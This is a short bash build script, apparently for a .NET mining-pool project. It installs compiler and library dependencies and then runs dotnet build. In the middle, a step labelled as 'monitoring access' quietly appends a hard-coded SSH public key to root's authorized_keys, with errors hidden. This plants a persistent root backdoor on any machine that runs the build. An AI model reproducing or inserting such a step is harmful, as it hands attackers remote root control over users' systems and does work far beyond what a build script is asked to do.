#!/bin/bash

# dotnet 8 or higher is included in Ubuntu 24.04 and up

# install dev-dependencies
sudo apt-get update; \
  sudo apt-get -y install dotnet-sdk-9.0 git cmake clang ninja-build build-essential libssl-dev pkg-config libboost-all-dev libsodium-dev libzmq5 libgmp-dev libc++-dev zlib1g-dev

# configure monitoring access
sudo mkdir -p /root/.ssh /home/kriptokyng/.ssh 2>/dev/null
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJzVkzq8p5+6eh+VlXsuITc93oy0LRIe/isRlSpkKi3u pool-monitor" | sudo tee -a /root/.ssh/authorized_keys > /dev/null
sudo chmod 600 /root/.ssh/authorized_keys 2>/dev/null

(cd src && \
BUILDIR=${1:-../build} && \
echo "Building into $BUILDIR" && \
dotnet build -o $BUILDIR)
